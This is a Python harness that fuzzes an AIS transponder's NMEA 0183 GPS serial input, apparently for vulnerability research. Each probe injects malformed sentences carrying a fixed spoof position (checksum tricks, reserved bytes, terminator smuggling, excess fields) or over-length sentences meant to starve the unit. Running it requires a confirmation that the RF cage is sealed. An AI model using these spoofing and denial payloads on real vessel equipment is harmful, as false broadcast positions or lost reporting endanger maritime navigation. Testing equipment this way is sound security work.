#!/usr/bin/env python3
r"""
serial_cve_suite.py -- CVE-enumeration harness for the AIS serial (NMEA 0183 / IEC 61162-1)
interface. Focused (not the full conformance suite): it drives the strong CVE candidates and
parser-differential hypotheses, and it is built on the CORRECT measurement model borrowed from
the conformance harness:

  * A CONTINUOUS VALID BASELINE (fixed 42.35/-70.90, reported with SOG=12 so the unit reports
    fast) flows the whole time.
  * Each probe is a SINGLE injection against that running-good state (NOT a flood). So:
      - the unit REJECTS it -> its output stays on the baseline position           (good)
      - the unit ACCEPTS it -> its output shows the fixed SPOOF position 43.5/-71.5 (violation)
      - the unit DEGRADES   -> it drops to no-fix (91/181) / stops                  (robustness)
    Because good GPS keeps flowing, a rejection can no longer be confused with a denial.
  * Over-length probes are TIMED. Writing an N-char sentence at the baud rate takes
    predicted_s = N*10/baud seconds, during which the sensor bus is monopolized and the unit is
    starved -> the DoS suppression is ~predicted_s, and it SCALES with N (the headline claim).
  * After each probe the baseline is held for gap >= reacquisition (and >= predicted_s for the
    big over-length probes) so no-fix never bleeds into the next probe.

Smuggling / field-shift probes carry a SECOND distinct position (44.5/-72.5 or a field-shift
target) so the analyzer can tell a smuggled/second-sentence parse from a normal one.

analyze_serial_cve.py correlates the manifest with the unit's serial output AND the VHF witness,
so each finding is judged on BOTH interfaces (did the spoof reach the air; did RF reporting stop).

** SAFETY ** the unit transmits its (spoofed) position over VHF -> cage sealed only.
Requires pyserial for a live run; --dry-run needs nothing.
"""
import argparse, json, os, sys, time
try:
    import serial
except Exception:
    serial = None

BASE = (42.3500, -70.9000)          # continuous valid baseline
SPOOF = (43.5000, -71.5000)         # fixed spoof every position-bearing probe carries
SMUGGLE = (44.5000, -72.5000)       # a smuggled 2nd sentence carries this
SPOOF_LAT_F, SPOOF_LON_F = "4330.0000", "07130.0000"   # 43.5N / 71.5W as NMEA fields


# ---------------- NMEA builders (checksum per IEC 61162-1 7.2.4) ----------------
def cksum(body):
    c = 0
    for ch in body:
        c ^= ord(ch)
    return f"{c:02X}"


def cksum_bytes(b):
    c = 0
    for x in b:
        c ^= x
    return f"{c:02X}"


def sent(body, term="\r\n", ck=None, star="*"):
    cs = cksum(body) if ck is None else ck
    return f"${body}{star}{cs}{term}"


def _latf(deg):
    h = 'N' if deg >= 0 else 'S'; deg = abs(deg); d = int(deg); m = (deg - d) * 60
    return f"{d:02d}{m:07.4f}", h


def _lonf(deg):
    h = 'E' if deg >= 0 else 'W'; deg = abs(deg); d = int(deg); m = (deg - d) * 60
    return f"{d:03d}{m:07.4f}", h


def gga(lat, lon):
    ts = time.strftime("%H%M%S.00", time.gmtime()); la, lah = _latf(lat); lo, loh = _lonf(lon)
    return sent(f"GPGGA,{ts},{la},{lah},{lo},{loh},1,08,0.9,10.0,M,0.0,M,,")


def rmc(lat, lon, sog=0.0, cog=90.0):
    ts = time.strftime("%H%M%S.00", time.gmtime()); ds = time.strftime("%d%m%y", time.gmtime())
    la, lah = _latf(lat); lo, loh = _lonf(lon)
    return sent(f"GPRMC,{ts},A,{la},{lah},{lo},{loh},{sog:.1f},{cog:.1f},{ds},,,A")


def baseline_batch():
    """Fixed baseline position, SOG=12 so the unit reports at the fast (2s) rate."""
    return [gga(*BASE), rmc(*BASE, sog=12.0, cog=90.0)]


# spoof-position bodies the probes mutate (structurally valid unless the probe breaks it)
SPOOF_RMC_BODY = f"GPRMC,120000.00,A,{SPOOF_LAT_F},N,{SPOOF_LON_F},W,0.0,90.0,180626,,,A"
# the baseline-position body, whose (valid) checksum is reused by the retain-original probe
BASE_RMC_BODY = "GPRMC,120000.00,A,4221.0000,N,07054.0000,W,0.0,90.0,180626,,,A"


def ok_body_bytes(body_bytes, start=b"$"):
    """start + body + *cc + CRLF with a VALID checksum over body_bytes, so the only anomaly
    is the feature under test (used for reserved/control-char probes)."""
    return start + body_bytes + b"*" + cksum_bytes(body_bytes).encode() + b"\r\n"


def overlen_rmc(total_chars):
    """A spoof-position GPRMC padded with a trailing numeric field to exactly total_chars
    (counting $ and *cc, excluding CRLF)."""
    head = f"GPRMC,120000.00,A,{SPOOF_LAT_F},N,{SPOOF_LON_F},W,0.0,90.0,180626,,,A"
    fixed = 1 + len(head) + 3
    pad = total_chars - fixed
    if pad > 0:
        head = head + "," + "9" * (pad - 1)
    return (sent(head)).encode()


# ---------------- probe catalog (CVE-focused) ----------------
# Each: id, finding, cve, gen()->bytes, and optional smuggle/shift targets + overlen length.
def build_probes(overlen_lengths):
    P = []

    def add(id, finding, cve, gen, smuggle=None, shift=None, overlen=None):
        P.append(dict(id=id, finding=finding, cve=cve, gen=gen,
                      smuggle=smuggle, shift=shift, overlen=overlen))

    # 1) OVERLENGTH -> DoS sweep (predicted_s = N*10/baud; suppression scales with N)
    for n in overlen_lengths:
        add(f"overlen_{n}", "1 overlength/DoS", "STRONG", (lambda n=n: overlen_rmc(n)), overlen=n)
    add("overlen_unterminated", "1 overlength/DoS", "STRONG",
        lambda: sent(f"GPRMC,120000.00,A,{SPOOF_LAT_F},N,{SPOOF_LON_F},W,0.0,90.0,180626"
                     + ",9" * 2000, term="").encode(), overlen=4000)

    # 6) INVALID CHECKSUM -> false position. Crude AND the plausible-but-wrong forms a unit may
    #    actually accept (lowercase / over-wrong-range / commas-excluded) -- the ones the crude
    #    "00"/"ZZ" tests miss.
    add("cks_wrong00", "6 invalid checksum", "STRONG", lambda: ("$" + SPOOF_RMC_BODY + "*00\r\n").encode())
    add("cks_nonhex", "6 invalid checksum", "STRONG", lambda: ("$" + SPOOF_RMC_BODY + "*ZZ\r\n").encode())
    add("cks_missing", "6 invalid checksum", "STRONG", lambda: ("$" + SPOOF_RMC_BODY + "\r\n").encode())
    add("cks_lowercase", "6 invalid checksum", "STRONG",
        lambda: ("$" + SPOOF_RMC_BODY + "*" + cksum(SPOOF_RMC_BODY).lower() + "\r\n").encode())
    add("cks_wrong_range", "6 invalid checksum", "STRONG",
        lambda: ("$" + SPOOF_RMC_BODY + "*" + cksum("$" + SPOOF_RMC_BODY) + "\r\n").encode())
    add("cks_retain_original", "6 invalid checksum", "STRONG",
        lambda: ("$" + SPOOF_RMC_BODY + "*" + cksum(BASE_RMC_BODY) + "\r\n").encode())
    add("cks_one_digit", "6 invalid checksum", "STRONG",
        lambda: ("$" + SPOOF_RMC_BODY + "*" + cksum(SPOOF_RMC_BODY)[0] + "\r\n").encode())

    # 3) RESERVED / CONTROL bytes in a data field (checksum kept VALID -> only anomaly is the
    #    byte). The char goes in the TIME field ("1200<ch>00.00") so the lat/lon/hemisphere
    #    fields stay intact -- if the unit accepts the sentence anyway, the spoof position shows.
    #    (Putting it in the hemisphere field would just corrupt the position and always reject,
    #    testing "broken field" instead of "reserved char in an otherwise-valid field".)
    for tag, ch in (("dollar", b"$"), ("bang", b"!"), ("star", b"*"), ("caret", b"^"),
                    ("tilde", b"\x7e"), ("del", b"\x7f"), ("nul", b"\x00"), ("cr", b"\r")):
        body = (b"GPRMC,1200" + ch + b"00.00,A," + SPOOF_LAT_F.encode() + b",N,"
                + SPOOF_LON_F.encode() + b",W,0.0,90.0,180626,,,A")
        add(f"reserved_{tag}", "3 reserved byte", "MODERATE", (lambda body=body: ok_body_bytes(body)))

    # 4/5) TERMINATOR SMUGGLING: first sentence spoof, smuggled 2nd sentence at SMUGGLE posn
    def smuggle_gen(term):
        first = sent(SPOOF_RMC_BODY, term=term)
        sm_body = f"GPRMC,120000.00,A,4430.0000,N,07230.0000,W,0.0,90.0,180626,,,A"   # 44.5/-72.5
        return (first + sent(sm_body)).encode()
    add("doubled_terminator", "4 doubled terminator", "MODERATE",
        lambda: smuggle_gen("\r\n\r\n"), smuggle=SMUGGLE)
    add("lfcr_swap", "5 swapped LF/CR", "WEAK", lambda: smuggle_gen("\n\r"), smuggle=SMUGGLE)

    # 8) TOO MANY FIELDS / field-shift: two extra leading fields; a lenient parser may read the
    #    shifted fields as lat/lon. The shift target is what reading fields +2 over yields here:
    #    with EXTRA1,EXTRA2 prepended, a shift makes the time field look like lat -> non-numeric,
    #    so we flag any non-baseline/non-spoof position as a differential.
    add("too_many_fields", "8 excess fields", "MODERATE",
        lambda: ("$GPRMC,EXTRA1,EXTRA2,120000.00,A," + SPOOF_LAT_F + ",N," + SPOOF_LON_F
                 + ",W,0.0,90.0,180626,,,A*" + cksum("GPRMC,EXTRA1,EXTRA2,120000.00,A,"
                 + SPOOF_LAT_F + ",N," + SPOOF_LON_F + ",W,0.0,90.0,180626,,,A") + "\r\n").encode(),
        shift="ANY")

    # 7) ADDRESS field: digits / lowercase / special in talker
    add("talker_digits", "7 talker digits", "WEAK",
        lambda: sent("G1RMC,120000.00,A," + SPOOF_LAT_F + ",N," + SPOOF_LON_F
                     + ",W,0.0,90.0,180626,,,A").encode())
    add("talker_lower", "7 talker digits", "WEAK",
        lambda: ("$gprmc,120000.00,A," + SPOOF_LAT_F + ",N," + SPOOF_LON_F
                 + ",W,0.0,90.0,180626,,,a*00\r\n").encode())

    # 9-12) SEMANTIC / plausibility (spec absent): structurally valid, impossible content at spoof
    add("speed_no_movement", "9 speed w/o movement", "SEMANTIC",
        lambda: sent(f"GPRMC,120000.00,A,{SPOOF_LAT_F},N,{SPOOF_LON_F},W,60.0,90.0,180626,,,A").encode())
    add("status_void", "9 status void", "SEMANTIC",
        lambda: sent(f"GPRMC,120000.00,V,{SPOOF_LAT_F},N,{SPOOF_LON_F},W,0.0,90.0,180626,,,A").encode())
    add("fix_invalid", "9 fix invalid", "SEMANTIC",
        lambda: sent(f"GPGGA,120000.00,{SPOOF_LAT_F},N,{SPOOF_LON_F},W,0,04,2.0,10.0,M,,M,,").encode())
    return P


# ---------------- runner ----------------
def hold_baseline(ser, seconds, rate=1.0):
    end = time.time() + seconds
    while time.time() < end:
        for s in baseline_batch():
            if ser is not None:
                try: ser.write(s.encode())
                except Exception: pass
        if ser is None:
            return
        time.sleep(rate)


def main():
    ap = argparse.ArgumentParser(description="Serial CVE-enumeration suite (continuous-baseline model).")
    ap.add_argument("--gps-port"); ap.add_argument("--gps-baud", type=int, default=4800)
    ap.add_argument("--gap", type=float, default=50.0, help="baseline recovery seconds after each probe (>= reacquisition)")
    ap.add_argument("--accept-dwell", type=float, default=6.0,
                    help="for non-DoS probes, seconds to REPEAT the malformed sentence at the GPS "
                         "rate (a real line-takeover sends the spoof continuously). A single "
                         "sentence 1.5 deg off can be filtered as an outlier, so acceptance is "
                         "only trustworthy when the spoof is offered repeatedly. DoS/overlength "
                         "probes stay single-write (their effect is the write-time suppression).")
    ap.add_argument("--reacq", type=float, default=30.0, help="extra recovery to add on top of an over-length write time")
    ap.add_argument("--settle", type=float, default=90.0, help="initial baseline settle")
    ap.add_argument("--overlen-lengths", type=int, nargs="+",
                    default=[90, 200, 500, 1000, 2048, 4096, 8192, 16384])
    ap.add_argument("--only", nargs="+")
    ap.add_argument("--logdir", default=os.path.expanduser("~/ais_tx"))
    ap.add_argument("--dry-run", action="store_true")
    ap.add_argument("--i-confirm-cage-sealed", action="store_true")
    args = ap.parse_args()

    probes = build_probes(tuple(args.overlen_lengths))
    if args.only:
        probes = [p for p in probes if p["id"] in args.only]

    if args.dry_run:
        for p in probes:
            raw = p["gen"](); n = len(raw)
            pred = n * 10.0 / args.gps_baud if p["overlen"] else 0.0
            shown = raw.decode("latin-1").replace("\r", "\\r").replace("\n", "\\n").replace("\x00", "\\0")
            print(f"[{p['cve']:8}] {p['id']:22} len={n:>5} pred_dos={pred:5.1f}s  {shown[:96]}")
        print(f"\n{len(probes)} probes. baseline={BASE} spoof={SPOOF} smuggle={SMUGGLE} (dry-run)")
        return

    if serial is None:
        print("needs pyserial: pip install pyserial --break-system-packages"); sys.exit(1)
    if not args.i_confirm_cage_sealed:
        if input("Type EXACTLY 'cage is sealed' to run: ").strip() != "cage is sealed":
            print("Aborted."); sys.exit(0)

    os.makedirs(args.logdir, exist_ok=True)
    stamp = time.strftime("%Y%m%dT%H%M%SZ", time.gmtime())
    manifest = os.path.join(args.logdir, f"serialcve_{stamp}.jsonl")
    mf = open(manifest, "a", buffering=1)
    def rec(**kw): mf.write(json.dumps({"t": time.time(),
                    "utc": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()), **kw}) + "\n")

    ser = serial.Serial(args.gps_port, args.gps_baud, timeout=1)
    rec(event="session_start", base_lat=BASE[0], base_lon=BASE[1],
        spoof_lat=SPOOF[0], spoof_lon=SPOOF[1], gps_baud=args.gps_baud, n=len(probes))
    print(f"baseline @ {BASE}, spoof {SPOOF}; settling {args.settle}s ...")
    hold_baseline(ser, args.settle)
    rec(event="baseline", name="baseline_settle"); hold_baseline(ser, 3)

    try:
        for i, p in enumerate(probes):
            raw = p["gen"](); pred = len(raw) * 10.0 / args.gps_baud if p["overlen"] else 0.0
            sm = p["smuggle"] or (None, None)
            rec(event="probe_start", id=p["id"], finding=p["finding"], cve=p["cve"],
                spoof_lat=SPOOF[0], spoof_lon=SPOOF[1],
                smuggle_lat=sm[0], smuggle_lon=sm[1], shift=p["shift"],
                predicted_s=round(pred, 3), sent_len=len(raw),
                sample=raw[:120].decode("latin-1").replace("\x00", "\\0"))
            print(f"[{i+1}/{len(probes)}] {p['id']} ({p['cve']}) pred_dos={pred:.1f}s")
            t0 = time.time()
            if p["overlen"]:
                # DoS probe: a SINGLE write -- the effect under test is the write-time monopoly.
                ser.write(raw); ser.flush()
                reps = 1
            else:
                # acceptance/parser/semantic probe: REPEAT the malformed spoof at ~1/s for the
                # dwell, so a genuine acceptance shows up reliably (not filtered as a lone outlier)
                # and a rejection is confirmed by the baseline holding across many repeats.
                reps = 0; end = t0 + args.accept_dwell
                while time.time() < end:
                    ser.write(raw); ser.flush(); reps += 1; time.sleep(1.0)
            write_s = time.time() - t0
            rec(event="probe_end", id=p["id"], write_s=round(write_s, 3), reps=reps)
            hold_baseline(ser, max(args.gap, pred + args.reacq))   # recovery >= reacquisition and write time
    except KeyboardInterrupt:
        print("\ninterrupted."); rec(event="interrupted")
    finally:
        hold_baseline(ser, 3); ser.close(); rec(event="session_end"); mf.close()
    print(f"\ndone. manifest: {manifest}\nfeed it + the unit's serial output + the VHF capture to analyze_serial_cve.py")


if __name__ == "__main__":
    main()
